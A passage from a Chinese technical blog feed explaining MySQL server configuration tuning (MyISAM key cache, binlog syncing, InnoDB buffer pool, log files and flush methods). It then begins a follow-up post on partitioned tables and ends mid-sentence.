存储引擎，请显式地进行配置。许多用户认为其数据库使用了某种存储引擎但实际上却使用的是另外一种，就是因为默认配置的问题。</p><p>接着设置数据文件的位置，这里把 pid 文件和 socket 文件放到相同的位置，当然也可以选择其它位置，但要注意的是不要将 socket 文件和 pid 文件放到 MySQL 编译的默认位置，因为不同版本的 MySQL，这两个文件的默认路径可能会不一致，最好明确地设置这些文件的位置，以免版本升级时出现问题。</p><blockquote><p>在类 UNIX 系统下本地连接 MySQL 可以采用 UNIX 域套接字方式，这种方式需要一个套接字（socket）文件，即配置中的mysql.sock文件。</p></blockquote><blockquote><p>当 MySQL 实例启动时，会将自己的进程 ID 写入一个文件中——该文件即为 pid 文件。该文件可由参数pid-file控制，默认位于数据库目录下，文件名为主机名.pid。</p></blockquote><h4 id="DATA-STORAGE"><a href="#DATA-STORAGE" class="headerlink" title="DATA STORAGE"></a>DATA STORAGE</h4><p>datadir用于配置数据文件的存储位置，没有什么好说的。</p><p><strong>为缓存分配内存</strong><br>接下来有许多涉及到缓存的配置项，缓存设置多大，最直接的因素肯定是服务器内存的大小。如果服务器只运行 MySQL，所有不需要为 OS 以及查询处理保留的内存都可以用在 MySQL 缓存。为 MySQL 缓存分配更多内存，可以有效的避免磁盘访问，提升数据库性能。大部分情况来说最为重要的缓存：</p><ul><li>InnoDB 缓冲池</li><li>InnoDB 日志文件和 MyISAM 数据的操作系统缓存 (MyISAM 依赖于 OS 缓存数据)</li><li>MyISAM 键缓存</li><li>查询缓存</li><li>无法配置的缓存，比如：bin-log 或者表定义文件的 OS 缓存</li></ul><p>还有一些其他缓存，但它们通常不会使用太多内存。关于查询缓存，前面文章 (参考本系列的第一篇) 已有介绍，大多数情况下我们不建议开启查询缓存，因此上文的配置中query-cache-type=0表示禁用了查询缓存，相应的查询缓存大小query-cache-size=0。除开查询缓存，剩下关于 InnoDB 和 MyISAM 的相关缓存，在接下来会做详细介绍。</p><p>如果只使用单一存储引擎，配置服务器就会简单许多。如果只使用 MyISAM 表，就可以完全关闭 InnoDB，而如果只使用 InnoDB，就只需要分配最少的资源给 MyISAM（MySQL 内部系统表使用 MyISAM 引擎）。但如果是混合使用各种存储引擎，就很难在他们之间找到恰当的平衡，因此只能根据业务做一个猜测，然后在运行中观察服务器运行状况后做出调整。</p><h4 id="MyISAM"><a href="#MyISAM" class="headerlink" title="MyISAM"></a>MyISAM</h4><p><strong>key-buffer-size</strong></p><p><code>key-buffer-size</code>用于配置 <code>MyISAM</code>键缓存大小，默认只有一个键缓存，但是可以创建多个。MyISAM 自身只缓存索引，不缓存数据 (依赖 OS 缓存数据)。如果大部分表都是 <code>MyISAM</code>，那么应该为键缓存设置较多的内存。但如何确定该设置多大？<br>假设整个数据库中表的索引大小为 X，肯定不需要把缓存设置得比 X 还大，所以当前的索引大小就成为这个配置项的重要依据。可以通过下面两种方式来查询当前索引的大小：</p><p>1.通过 SQL 语句查询<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT SUM(INDEX_LENGTH) FROM INFORMATION_SCHEMA.TABLES WHERE ENGINE = <span class="string">'MYISAM'</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>2.统计索引文件的大小<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ du -sch `find /path/to/mysql/data/directory/ -name <span class="string">"*.MYI"</span>`</span><br><span class="line">比如：</span><br><span class="line">root@dev-msc3:<span class="comment"># du -sch `find /var/lib/mysql -name "*.MYI"`</span></span><br><span class="line">72K        /var/lib/mysql/static/t_global_region.MYI</span><br><span class="line">40K        /var/lib/mysql/mysql/db.MYI</span><br><span class="line">12K        /var/lib/mysql/mysql/proxies_priv.MYI</span><br><span class="line">12K        /var/lib/mysql/mysql/tables_priv.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/func.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/columns_priv.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/proc.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/event.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/user.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/procs_priv.MYI</span><br><span class="line">4.0K       /var/lib/mysql/mysql/ndb_binlog_index.MYI</span><br><span class="line">164K       total</span><br></pre></td></tr></tbody></table></figure><p></p><p>你可能会问，刚创建好的数据库，根本就没什么数据，索引文件大小为 0，那如何配置键缓存大小？这时候只能根据经验值：不超过为操作系统缓存保留内存的 25% ~ 50%。设置一个基本值，等运行一段时间后，根据运行情况来调整键缓存大小。总结来说，索引大小与 OS 缓存的 25%~50% 两者间取小者。当然还可以计算键缓存的使用情况，如果一段时间后还是没有使用完所有的键缓存，就可以把缓冲区调小一点，计算缓存区的使用率可以通过以下公式：<br><strong>(key_blocks_unused * key_cache_block_size) / key_buffer_size</strong></p><blockquote><p>说明：</p></blockquote><blockquote><p>key_blocks_unused 的值可以通过 SHOW STATUS 获取</p></blockquote><blockquote><p>key_cache_block_size 的值可以通过 SHOW VARIABLES 获取</p></blockquote><p>键缓存块大小是一个比较重要的值，因为它影响 MyISAM、OS 缓存以及文件系统之间的交互。如果缓存块太小，可能会碰到写时读取 (OS 在写数据之前必须先从磁盘上读取一些数据)，关于写时读取的相关知识，大家可以自行查阅。</p><p>关于缓存命中率，这里再说一点。缓存命中率有什么意义？其实这个数字没太大的作用。比如 99% 和 99.9% 之间看起来差距很小，但实际上代表了 10 倍的差距。缓存命中率的实际意义与应用也有很大关系，有些应用可以在命中率 99% 下良好的工作，有些 I/O 密集型应用，可能需要 99.99%。所以从经验上来说，每秒未命中次数这个指标实际上会更有用一些。比如每秒 5 次未命中可能不会导致 IO 繁忙，但每秒 100 次缓存未命中则可能出现问题。</p><p>MyISAM 键缓存的每秒未命中次数可以通过如下命令监控：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算每隔10s缓存未命中次数的增量</span></span><br><span class="line"><span class="comment"># 使用此命令时请带上用户和密码参数：mysqladmin -uroot -pxxx extended-status -r -i 10 | grep Key_reads</span></span><br><span class="line">$ mysqladmin extended-status -r -i 10 | grep Key_reads</span><br></pre></td></tr></tbody></table></figure><p></p><p>最后，即使没有使用任何 MyISAM 表，依然需要将key-buffer-size设置为较小值，比如 32M，因为 MySQL 内部会使用 MyISAM 表，比如 GROUP BY 语句可能会创建 MyISAM 临时表。</p><h4 id="myisam-recover"><a href="#myisam-recover" class="headerlink" title="myisam-recover"></a>myisam-recover</h4><p>myisam-recover选项用于配置 MyISAM 怎样寻找和修复错误。打开这个选项会通知 MySQL 在打开表时，检查表是否损坏，并在找到问题时进行修复，它可以设置如下值：    </p><ul><li>DEFAULT：表示不设置，会尝试修复崩溃或者未完全关闭的表，但在恢复数据时不会执行其它动作</li><li>BACKUP：将数据文件备份到. bak 文件，以便随后进行检查</li><li>FORCE：即使. myd 文件中丢失的数据超过 1 行，也让恢复动作继续执行</li><li>QUICK：除非有删除块，否则跳过恢复</li></ul><p>可以设置多个值，每个值用逗号隔开，比如配置文件中的BACKUP,FORCE会强制恢复并且创建备份，这样配置在只有一些小的 MyISAM 表时有用，因为服务器运行着一些损坏的 MyISAM 表是非常危险的，它们有时可能会导致更多数据损坏，甚至服务器崩溃。然而如果有很大的表，它会导致服务器打开所有的 MyISAM 表时都检查和修复，大表的检查和修复可能会耗费大量时间，且在这段时间里，MySQL 会阻止这个连接做其它任何操作，这显然是不切实际的。</p><p>因此，在默认使用 InnoDB 存储引擎时，数据库中只有非常小的 MyISAM 表时，只需要配置key-buffe-size于一个很小的值 (32M) 以及myisam-recover=BACKUP,FORCE。当数据库中大部分表为 MyISAM 表时，请根据上文的公式合理配置key-buffer-size，而myisam-recover则可以关闭，在启动后使用CHECK TABLES和REPAIR TABLES命令来做检查和修复，这样对服务器的影响比较小。</p><h4 id="SAFETY"><a href="#SAFETY" class="headerlink" title="SAFETY"></a>SAFETY</h4><p>基本配置设置到位后，MySQL 已经比较安全了，这里仅仅列出两个需要注意的配置项，如果需要启用一些使服务器更安全和可靠的设置，可以参考 MySQL 官方手册，但需要注意的是，它们其中的一些选项可能会影响性能，毕竟保证安全和可靠需要付出一些代价。</p><p><strong>max-allowed-packet</strong><br><code>max-allowed-packet</code>防止服务器发送太大的数据包，也控制服务器可以接收多大的包。默认值 4M，可能会比较小。如果设置太小，有时复制上会出问题，表现为从库不能接收主库发过来的复制数据。如果表中有 Blob 或者 Text 字段，且数据量较大的话，要小心，如果数据量超过这个变量的大小，它们可能被截断或者置为 NULL，这里建议设置为 16M。</p><p><strong>max-connect-errors</strong><br>这个变量是一个 MySQL 中与安全相关的计数器值，它主要防止客户端暴力破解密码。如果某一个客户端尝试连接 MySQL 服务器失败超过 n 次，则 MySQL 会无条件强制阻止此客户端连接，直到再次刷新主机缓存或者重启 MySQL 服务器。</p><p>这个值默认为 10，太小了，有时候网络抽风或者应用配置出现错误导致短时间内不断尝试重连服务器，客户端就会被列入黑名单，导致无法连接。如果在内网环境，可以确认没有安全问题可以把这个值设置的大一点，默认值太容易导致问题。</p><h4 id="LOGGING"><a href="#LOGGING" class="headerlink" title="LOGGING"></a>LOGGING</h4><p>接下来看下日志的配置，对于 MySQL 来说，慢日志和 bin-log 是非常重要的两种日志，前者可以帮助应用程序监控性能问题，后者在数据同步、备份等方面发挥着非常重要的作用。</p><p>关于 bin-log 的 3 个配置，log-bin用于配置文件存放路径，expire_logs_days让服务器在指定天数之后清理旧的日志，即配置保留最近多少天的日志。除非有运维手动备份清理 bin-log，否则强烈建议打开此配置，如果不启用，服务器空间最终将会被耗尽，导致服务器卡住或者崩溃。</p><h4 id="sync-binlog"><a href="#sync-binlog" class="headerlink" title="sync-binlog"></a>sync-binlog</h4><p><code>sync-binlog</code>控制当事务提交之后，MySQL 是否将 bin-log 刷新到磁盘。如果其值等于 0 或者大于 1 时，当事务提交之后，MySQL 不会将 bin-log 刷新到磁盘，其性能最高，但存在的风险也是最大的，因为一旦系统崩溃，bin-log 将会丢失。而当其值等于 1 时，是最安全的，这时候即使系统崩溃，最多也就丢失本次未完成的事务，对实际的数据没有实质性的影响，但性能较差。</p><p>需要注意的是，在 5.7.7 之前的版本，这个选择的默认值为 0，而之后的版本默认值为 1，也就是最安全的策略。对于高并发的性能，需要关注这一点，防止版本升级后出现性能问题。</p><p>剩下的 4 个配置项就没太多要说的。</p><ul><li>log-error：用于配置错误日志的存放目录</li><li>slow-query-log：打开慢日志，默认关闭</li><li>slow-query-log-file：配置慢日志的存放目录</li><li>log-queries-not-using-indexes：如果该 sql 没有使用索引，会将其写入到慢日志，但是否真的执行很慢，需要区分，默认关闭。</li></ul><h4 id="CACHES-AND-LIMITS"><a href="#CACHES-AND-LIMITS" class="headerlink" title="CACHES AND LIMITS"></a>CACHES AND LIMITS</h4><p><strong>tmp-table-size && max-heap-table-size</strong><br>这两个配置控制使用 Memory 引擎的内存临时表可以使用多大的内存。如果隐式内存临时表的大小超过这两个值，将会被转为磁盘 MyISAM 表 (隐式临时表由服务器创建，用户保存执行中的查询的中间结果)。</p><p>如果查询语句没有创建庞大的临时表 (通过合理的索引和查询设计来避免)，可以把这个值设大一点，以免需要把内存临时表转换为磁盘临时表。但要谨防这个值设置得过大，如果查询确实会创建很大的临时表，那么还是使用磁盘比较好，毕竟并发数一起来，所需要的内存就会急剧增长。</p><p>应该简单的把这两个变量设为同样的值，这里选择了 32M，可以通过仔细检查created-tmp-disk-tables和created-tmp-tables两个变量来指导你设置，这两个变量的值将展示临时表的创建有多频繁。</p><p><strong>max-connections</strong></p><p>用于设置用户的最大连接数，保证服务器不会应为应用程序激增的连接而不堪重负。如果应用程序有问题，或者服务器遇到连接延迟问题，会创建很多新连接。但如果这些连接不能执行查询，那打开一个连接没什么好处，所以被 “太多的连接” 错误拒绝是一种快速而且代价小的失败方式。</p><p>在服务器资源允许的情况下，可以把<code>max-connections</code>设置的足够大，以容纳正常可能达到的负载。若认为正常情况将有 <code>300</code> 或者更多连接，可以设置为 <code>500</code> 或者更多 (应对高峰期)。默认值是 <code>100</code>，太小了，这里设置为 <code>500</code>，但并不意味着其是一个合理的值，应该监控应用有多少连接，然后根据监控值 (观察<code>max_used_connections</code>随时间的变化) 来设置。</p><p><strong>thread-cache-size</strong></p><p>线程缓存保存那些当前没有与连接关联但是准备为后面新连接服务的线程。当一个新的连接创建时，如果缓存中有线程存在，MySQL 则从缓存中删除一个线程，并且把它分配给这个新连接。当连接关闭时，如果线程缓存还有空间的话，MySQL 又会把线程放回缓存。如果没有空间的话，MySQL 会销毁这个线程。只要 MySQL 在缓存里还有空闲的线程，它就可以迅速响应连接请求，因为这样就不用为每个连接创建新线程。<code>thread-cache-size</code>指定 MySQL 可以保存在缓存中的线程数量。如果服务器没有很多的连接请求，一般不需要配置这个值。</p><p>如何判断这个值该设置多大？</p><p>观察threads-connected变量，如果threads-connected在 100-120，那么thread-cache-size设置为 20。如果它保持在 500-700，200 的线程缓存应该足够大了。可以这么理解：当同时有 700 个连接时，可能缓存中没有线程。在 500 个连接时，有 200 个缓存的线程准备为负载再次增加到 700 个连接时使用。</p><p><strong>open-files-limit</strong></p><p>在类 Uinux 系统上我们把它设置得尽可能大。现代 OS 中打开句柄开销都很小，如果此参数设置过小，可能会遇到 “打开的文件太多 (too many open files)” 错误。</p><p><strong>table_cache_size</strong></p><p>表缓存跟线程缓存类似，但存储的对象是表，其包含表. frm 文件的解析结果和一些其他数据。准确的说，缓存的数据依赖于存储引擎，比如，对于 MyISAM，缓存表的数据和索引的文件描述符。表缓存对 InnoDB 的存储引擎来说，重要性会小很多，因为 InnoDB 不依赖它来做那么多的事。</p><p>从 5.1 版本及以后，表缓存就被分为两个部分：打开表缓存和定义表缓存，分别通过table-open-cache-size和table-definition-cache-size变量来配置。通常可以把table-definition-cache-size设置得足够高，以缓存所有的表定义，因为大部分存储引擎都能从table-definition-cache获益。</p><p><strong>InnoDB</strong></p><p>InnoDB 应该是使用最广发的存储引擎，最重要的配置选项是下面这两个：innodb-buffer-pool-size与innodb-log-file-size，解决这两个配置基本上就解决了真实场景下的大部分配置问题。</p><p><strong>innodb-buffer-pool-size</strong></p><p>如果大部分是 InnoDB 表，那么 InnoDB 缓冲池或许比其他任何东西都更需要内存，InnoDB 缓冲池缓冲的数据：索引、行数据、自适应哈希索引、插入缓冲、锁以及其他内部数据结构。InnoDB 还使用缓冲池来帮助延迟写入，这样就可以合并多个写入操作，然后一起顺序写入，提升性能。总之，InnoDB 严重依赖缓冲池，必须为其分配足够的内存。</p><p>当然，如果数据量不大且不会快速增长，就没有必要为缓冲池分配过多的内存，把缓冲池配置得比需要缓存的表和索引还要大很多，实际上也没有什么意义。很大的缓冲池也会带来一些挑战，例如，预热和关闭都会花费很长的时间。如果有很多脏页在缓冲池里，InnoDB 关闭时可能会花很长时间来把脏页写回数据文件。虽然可以快速关闭，但是在启动时需要做更多的恢复工作，也就是说我们无法同时加速关闭和重启两个操作。当有一个很大的缓冲池，重启服务需要花费很长时间（几小时或者几天）来预热，尤其是磁盘很慢的时候，如果想加快预热时间，可以在重启后立刻进行全表扫描或者索引扫描，把索引载入缓冲池。</p><p>可以看到示例的配置文件中把这个值配置为 12G，这不是一个标准配置，需要根据具体的硬件来估算。那如何估算？</p><p>前面的小节，我们说到，MySQL 中最重要的缓存有 5 种，可以简单的使用下面的公式计算：</p><p><em><strong>InnoDB 缓冲池 = 服务器总内存 - OS 预留 - 服务器上的其他应用占用内存 - MySQL 自身需要的内存 - InnoDB 日志文件占用内存 - 其它内存 (MyISAM 键缓存、查询缓存等)</strong></em></p><p>具体来看，至少需要为 OS 保留 1~2G 内存，如果机器内存大的话可以预留多一些，建议 2GB 和总内存的 5% 为基准，以较大者为准，如果机器上还运行着一些内存密集型任务，比如，备份任务，那么可以为 OS 再预留多一些内存。不要为 OS 缓存增加任何内存，因为 OS 通常会利用所有剩下的内存来做文件缓存。</p><p>一般来说，运行 MySQL 的服务器很少会运行其他应用程序，但如果有的话，请为这些应用程序预留足够多的内存。</p><p>MySQL 自身运行还需要一些内存，但通常都不会太大。需要考虑 MySQL 每个连接需要的内存，虽然每个连接需要的内存都很少，但它还要求一个基本量的内存来执行任何给定的查询，而且查询过程中还需要为排序、GROUP BY 等操作分配临时表内存，因此需要为高峰期执行大量的查询预留足够的内存。这个内存有多大？只能在运行过程中监控。</p><p>如果大部分表都是 InnoDB，MyISAM 键缓存配置一个很小值足矣，查询缓存也建议关闭。</p><p>公式中就剩下 InnoDB 日志文件了，这就是我们接下来要说的。</p><p><strong>innodb-log-file-size && innodb-log-files-in-group</strong></p><p>如果对 InnoDB 数据表有大量的写入操作，那么选择合适的innodb-log-file-size值对提升 MySQL 性能很重要。InnoDB 使用日志来减少提交事务时的开销。日志中记录了事务，就无须在每个事务提交时把缓冲池的脏块 (缓存中与磁盘上数据不一致的页) 刷新到磁盘。事务修改的数据和索引通常会映射到表空间的随机位置，所以刷新这些变更到磁盘需要很多随机 I/O。一旦日志安全的写入磁盘，事务就持久化了，即使变更还没有写到数据文件，在一些意外情况发生时 (比如断电了)，InnoDB 可以重放日志并且恢复已经提交的事务。</p><p>InnoDB 使用一个后台线程智能地刷新这些变更到数据文件。实际上，事务日志把数据文件的随机 I/O 转换为几乎顺序地日志文件和数据文件 I/O，让刷新操作在后台可以更快的完成，并且缓存 I/O 压力。</p><p>整体的日志文件大小受控于<code>innodb-log-file-size</code>和<code>innodb-log-files-in-group</code>两个参数，这对写性能非常重要。日志文件的总大小是每个文件的大小之和。默认情况下，只有两个 5M 的文件，总共 10M，对高性能工作来说太小了，至少需要几百 M 或者上 G 的日志文件。这里要注意<code>innodb-log-files-in-group</code>这个参数，它控制日志文件的数量，从名字上看好似配置一个日志组有几个文件，实际上，log group表示一个重做日志的文件集合，没有参数也没有必要配置有多少个日志组。</p><p>修改日志文件的大小，需要完全关闭 MySQL，然后将旧的日志文件迁移到其他地方，重新配置参数，然后重启。重启时需要将旧的日志迁移回来，然后等待 MySQL 恢复数据后，再删除旧的日志文件，请一定要查看错误日志，确认 MySQL 重启成功后再删除旧的日志文件。</p><p>想要确定理想的日志文件大小，需要权衡正常数据变更的开销，以及崩溃时恢复需要的时间。如果日志太小，InnoDB 将必须要做更多的检查点，导致更多的日志写，在极个别情况下，写语句还会被拖累，在日志没有空间继续写入前，必须等待变更被刷新到数据文件。另一方面，如果日志太大，在崩溃时恢复就得做大量的工作，这可能增大恢复时间。InnoDB 会采用 checkpoint 机制来刷新和恢复数据，这会加快恢复数据的时间，具体可以参考：</p><ul><li><a href="http://www.cnblogs.com/cuisi/p/6590281.html" target="_blank" rel="noopener">MySQL-checkpoint 技术</a></li><li><a href="https://www.xaprb.com/blog/2011/01/29/how-innodb-performs-a-checkpoint/" target="_blank" rel="noopener">How InnoDB performs a checkpoint</a></li></ul><p><strong>innodb-flush-log-at-trx-commit</strong></p><p>前面讨论了很多缓存，InnoDB 日志也是有缓存的。当 InnoDB 变更任何数据时，会写一条变更记录到日志缓存区。在缓冲慢的时候、事务提交的时候，或者每一秒钟，InnoDB 都会将缓冲区的日志刷新到磁盘的日志文件。如果有大事务，增加日志缓冲区大小可以帮助减少 I/O，变量innodb-log-buffer-size可以控制日志缓冲区的大小。通常不需要把日志缓冲区设置的非常大，毕竟上述 3 个条件，任一条件先触发都会把缓冲区的内容刷新到磁盘，所以缓冲区的数据肯定不会太多，出入你的数据中有很多相当大的 BLOB 记录。通常来说，配置 1M~8M 即可。</p><p>既然存在缓冲区，怎样刷新日志缓冲就是我们需要关注的问题。日志缓冲必须刷新到磁盘，以确保提交的事务完全被持久化。如果和持久化相比，更在乎性能，可以修改 innodb-flush-log-at-trx-commit 变量来控制日志缓冲刷新的频率。</p><ul><li>0：每 1 秒钟将日志缓冲写到日志文件并刷新到磁盘，事务提交时不做任何处理</li><li>1：每次事务提交时，将日志缓冲写到日志文件并刷新到磁盘</li><li>2：每次事务提交时，将日志缓冲写到日志文件，然后每秒刷新一次到磁盘</li></ul><blockquote><p>1  是最安全的设置，保证不会丢失任何已经提交的事务，这也是默认的设置。</p></blockquote><blockquote><p>0 和 2 最主要的区别是，如果 MySQL 挂了，2 不会丢失事务，但 0 有可能，</p></blockquote><blockquote><p>2 在每次事务提交时，至少将日志缓冲刷新到操作系统的缓存，而 0 则不会。如果整个服务器挂了或者断电了，则还是可能会丢失一些事务。</p></blockquote><p><strong>innodb-flush-method</strong></p><p>前面都在讨论使用什么样的策略刷新、以及何时刷新日志或者数据，那 InnoDB 具体是怎样刷新数据的？使用innodb-flush-method选项可以配置 InnoDB 如何跟文件系统相互作用。从名字上看，会以为只能影响 InnoDB 怎么写数据，实际上还影响了 InnoDB Windows 和非 Windows 操作系统下这个选项的值是互斥的，也就是说有些值只能 Windows 下使用，有些只能在非 Windows 下使用，其中 Windows 下可取值：async_unbuffered、unbuffered、normal、Nosync与littlesync，非 Windows 取值：fdatasync、0_DIRECT、 0_DSYNC。</p><p>这个选项既会影响日志文件，也会影响数据文件，而且有时候对不同类型的文件的处理也不一样，导致这个选项有些难以理解。如果有一个选项来配置日志文件，一个选项来配置数据文件，应该会更好，但实际上它们混合在同一个配置项中。这里只介绍类 Unix 操作系统下的选项。</p><p><strong>fdatasync</strong></p><p>InnoDB 调用fsync()和fdatasync()函数来刷新数据和日志文件，其中fdatasync()只刷文件的数据，但不包含元数据 (比如：访问权限、文件拥有者、最后修改时间等描述文件特征的系统数据)，因此fsync()相比fdatasync()会产生更多的 I/O，但在某些场景下fdatasync()会导致数据损坏，因此 InnoDB 开发者决定用fsync()来代替fdatasync()。</p><p>fsync()的缺点是操作系统会在自己的缓存中缓冲一些数据，理论上双重缓冲是浪费的，因为 InnoDB 自己会管理缓冲，而且比操作系统更加智能。但如果文件系统能有更智能的 I/O 调度和批量操作，双重缓冲也并不一定是坏事：</p><ul><li>有的文件系统和 os 可以累积写操作后合并执行，通过对 I/O 的重排序来提升效率、或者并发写入多个设备</li><li>有的还可以做预读优化，比如连续请求几个顺序的块，它会通知硬盘预读下一个块</li></ul><p>这些优化在特定的场景下才会起作用，fdatasync为innodb-flush-method的默认值。</p><p><strong>0_DIRCET</strong></p><p>这个设置不影响日志文件并且不是所有的类 Unix 系统都有效，但至少在 Linux、FreeBSD 以及 Solaris 是支持的。这个设置依然使用 fsync 来刷新文件到磁盘，但是它完全关闭了操作系统缓存，并且是所有的读和写都直接通过存储设置，避免了双重缓冲。如果存储设备支持写缓冲或预读，那么这个选项并不会影响到设备的设置，比如 RAID 卡。</p><p><strong>0_DSYNC</strong></p><p>这个选项使得所有的写同步，即只有数据写到磁盘后写操作才返回，但它只影响日志文件，而不影响数据文件。</p><p>说完了每个配置的作用，最后是一些建议：如果使用类 Unix 操作系统并且 RAID 控制器带有电池保护的写缓存，建议使用 0_DIRECT，如果不是，默认值或者 0_DIRECT 都可能是最好的选择。</p><p><strong>innodb-file-per-table</strong></p><p>最后一个配置，说说 InnoDB 表空间，InnoDB 把数据保存在表空间内，它本质上是一个由一个或者多个磁盘文件组成的虚拟文件系统。InnoDB 表空间并不只是存储表和索引，它还保存了回滚日志、插入缓冲、双写缓冲以及其他内部数据结构，除此之外，表空间还实现了很多其它的功能。可以通过 innodb-data-file-path 配置项定制表空间文件，innodb-data-home-dir配置表空间文件存放的位置，比如：<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">innodb-data-home-dir = /var/lib/mysql</span><br><span class="line">innodb-data-file-path = ibdata1:1G;ibdata2:1G;ibdata3:1G</span><br></pre></td></tr></tbody></table></figure><p></p><p>这里在 3 个文件中创建了 3G 表空间，为了允许表空间在超过了分配的空间时还能增长，可以像这样配置最后一个文件自动扩展<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">innodb-data-file-path = ibdata1:1G;ibdata2:1G;ibdata3:1G:autoextend</span><br></pre></td></tr></tbody></table></figure><p></p><p><code>innodb-file-per-table</code>选项让 InnoDB 为每张表使用一个文件，这使得在删除一张表时回收空间容易很多，而且特别容易管理，并且可以通过查看文件大小来确定表大小，所以这里建议打开这个配置。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>MySQL 有太多的配置项，这里没有办法一一列举，重要的是了解每个配置的工作原理，从一个基础配置文件开始，设置符合服务器软硬件环境与工作负载的基本选项。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>高性能 MySQL(第 3 版)</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpeg&quot; class=&quot;full-image&quot; alt=&quot;
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL 优化原理(二)</title>
    <link href="https://jiemin.wang/2019/03/29/mysql-optimization-principle-2/"/>
    <id>https://jiemin.wang/2019/03/29/mysql-optimization-principle-2/</id>
    <published>2019-03-29T06:57:26.000Z</published>
    <updated>2019-03-29T09:52:11.444Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="img.jpg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>我打你应该，不打你悲哀~</strong></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>如果有同学看完<a href="https://jiemin.wang/2019/03/29/mysql-optimization-principle-1/">上一篇关于 MySQL 文章</a>，文末留有两个很开放的问题，如有兴趣可以在脑袋里想想。本文也会试着回答这两个问题，希望能给你一些参考。现在可以思考一个问题，如果数据量非常大的情况下，您根据业务选择了合适的字段，精心设计了表和索引，还仔细的检查了所有的 SQL，并确认已经没什么问题，但性能仍然不能满足您的要求，该怎么办呢？还有其他优化策略吗？答案是肯定的。接下来继续和您讨论一些常用的 MySQL 高级特性以及其背后的工作原理。</p><h4 id="分区表"><a href="#分区表" class="headerlink" title="分区表"></a>分区表</h4><p>合理的使用索引可以极大提升 MySQL 的查询性能，但如果单表数据量达到一定的程度，索引就无法起作用，因为在数据量超大的情况下，除非覆盖索引，因回表查询会产生大量的随机 I/O，数据库的响应时间可能会达到不可接受的程度。而且索引维护（磁盘空间、I/O 操作）的代价也会非常大。</p><p>因此，当单表数据量达到一定程度时（在 MySQL4.x 时代，MyISAM 存储引擎业内公认的性能拐点是 500W 行，MySQL5.x 时代的性能拐点则为 1KW ~ 2KW 行级别，具体需根据实际情况测试），为了提升性能，最为常用的方法就是分表。分表的策略可以是垂直拆分（比如：不同订单状态的订单拆分到不同的表），也可以是水平拆分（比如：按月将订单拆分到不同表）。但总的来说，分表可以看作是从业务角度来解决大数据量问题，它在一定程度上可以提升性能，但也大大提升了编码的复杂度，有过这种经历的同学可能深有体会。</p><p>在业务层分表大大增加了编码的复杂程度，而且处理数据库的相关代码会大量散落在应用各处，维护困难。那是否可以将分表的逻辑抽象出来，统一处理，这样业务层就不用关心底层是否分表，只需要专注在业务即可。答案当然是肯定的，目前有非常多的数据库中间件都可以屏蔽分表后的细节，让业务层像查询单表一样查询分表后的数据。如果再将抽象的逻辑下移到数据库的服务层，就是我们今天要讲的分区表。</p><p>分区可以看作是从技术层面解决大数据问题的有效方法，简单的理解，可以认为是 MySQL 底层帮我们实现分表，分区表是一个独立的逻辑表，底层由多个物理子表组成。存储引擎管理分区的各个底层表和管理普通表一样（所有底层表必须使用相同的存储引擎），分区表的索引也是在各个底层表上各自加上一个完全相同的索引。从存储引擎的角度来看，底层表和普通表没有任何不同，存储引擎也无须知道。在执行查询时，优化器会根据分区的定义过滤那些没有我们需要数据的分区，这样查询就无需扫描所有分区，只需要查找包含需要数据的分区就可以了。</p><p>更好的理解分区表，我们从一个示例入手：一张订单表，数据量大概有 10TB，如何设计才能使性能达到最优？</p><p>首先可以肯定的是，因为数据量巨大，肯定不能走全表扫描。使用索引的话，你会发现数据并不是按照想要的方式聚集，而且会产生大量的碎片，最终会导致一个查询产生成千上万的随机 I/O，应用随之僵死。所以需要选择一些更粗粒度并且消耗更少的方式来检索数据。比如先根据索引找到一大块数据，然后再在这块数据上顺序扫描。</p><p>这正是分区要做的事情，理解分区时还可以将其当作索引的最初形态，以代价非常小的方式定位到需要的数据在哪一片 “区域”，在这片 “区域” 